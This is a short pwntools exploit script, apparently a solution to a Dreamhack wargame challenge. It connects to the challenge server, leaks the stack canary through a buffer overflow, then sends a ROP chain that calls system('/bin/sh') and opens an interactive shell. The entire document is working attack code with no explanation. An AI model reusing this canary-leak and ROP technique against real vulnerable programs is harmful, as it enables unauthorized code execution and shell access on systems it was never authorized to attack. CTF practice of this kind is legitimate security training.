from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 16544)

payload = b"A" * 0x39
res = p.sendafter(b"Buf: ", payload)

p.recvuntil(payload)
canary = b"\x00" + p.recvn(7)
canary = u64(canary)
print(hex(canary))

payload = b"A" * 0x38
payload += p64(canary)
payload += b"B" * 0x8
payload += p64(0x0000000000400285)  # return gadget
payload += p64(0x0000000000400853)  # pop rdi gadget
payload += p64(0x400874)  # /bin/sh
payload += p64(0x004005D0)  # system

p.sendafter(b"Buf: ", payload)

p.interactive()
